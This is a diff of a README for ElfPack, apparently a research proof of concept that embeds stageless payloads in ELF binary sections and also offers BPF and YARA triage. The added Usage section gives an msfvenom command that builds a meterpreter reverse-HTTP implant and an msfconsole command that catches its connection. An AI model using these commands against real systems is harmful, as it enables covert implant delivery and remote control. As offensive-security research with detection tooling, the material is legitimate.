@@ -1,6 +1,5 @@
 # ElfPack: ELF Binary Section Docking for Stageless Payload Delivery
 
-
 ###  Highlights
 - Overview of payload bundling mechanisms: compilation,linking and loading.
 - Binary compatibility and creation of loosely coupled payloads to their delivery mechanism.
@@ -293,18 +292,34 @@ STIX tooling definition:
 ![ELF injector](docs/images/ELF-SCAP.png)
  
 
-## Building
+## Building ELFPack POC
 
 - For Cmake: before clean build run: `cmake --configure .` to configure your build environment. We support CMAke 3.18 atm.
 - `./build.sh`
 
-### Dependencies:
+### ELFPack Dependencies:
 - We use libreflect library for this POC from `https://github.com/rapid7/mettle`
 - it's built for you and distributed under `vendor/lib/reflect/libreflect.a` but can be rebuilt from the original repo if needed.
+- Runtime: If you would like to play with BPF and `bpftrace` polease install appropriate kernel headers for your distribution.
 
-### BPF
-If you would like to play with BPF and `bpftrace` polease install appropriate kernel headers for your distribution.
-
+### Usage
+- Frontend: See `run.sh`
+- Backend: This PoC operates with mettle metasploit implant so to catch your traffic on the MSF server you would use `aux/msfrc` RC file likes so:
+```shell
+msfconsole -r aux/triage/msfrc
+```
+- The MSF payload (mettle) may be generated as follows:
+```shell
+msfvenom -p linux/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=4443  -f elf > ../elfpack_staging/mettle-shell.elf
+```
+- BPF tracing can be done as follows (you need root):
+```shell
+sudo bpftrace aux/triage/elfpack_BPF_snoop_rules.bt
+```
+- YARA integration example via Python bindings can be seen in `aux/triage/elfpack_yar.py`
+```shell
+./aux/triage/elfpack_yar.py <path/to/elf/file> [elf_section]
+```
 
 
 
